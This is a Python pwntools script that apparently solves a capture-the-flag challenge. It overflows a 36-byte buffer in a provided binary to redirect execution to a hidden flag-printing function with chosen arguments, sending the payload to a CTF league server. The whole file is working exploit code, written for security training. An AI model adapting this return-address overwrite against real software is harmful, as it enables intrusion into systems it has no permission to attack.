from pwn import *

if __name__ == "__main__":
    # Find the address of the flag-printing function
    game_elf = ELF("./provided/return_for_adventure")
    flag_addr = game_elf.symbols["huh_whats_this_function_for"]
    print(f"flag function addr: {flag_addr}")

    # p = process("./provided/return_for_adventure")
    p = remote("chal.ctf-league.osusec.org", 7159)

    # Send proper input to reach breakfast function
    p.sendline(b"1")
    p.sendline(b"2")

    # payload: 36 characters + flag func address + junk + param_1 + param_2
    p.sendline(b"A"*36 + p32(flag_addr) + p32(0xdeadbeef) + p32(0x8badf00d) + p32(0xabadbabe))
    p.interactive()
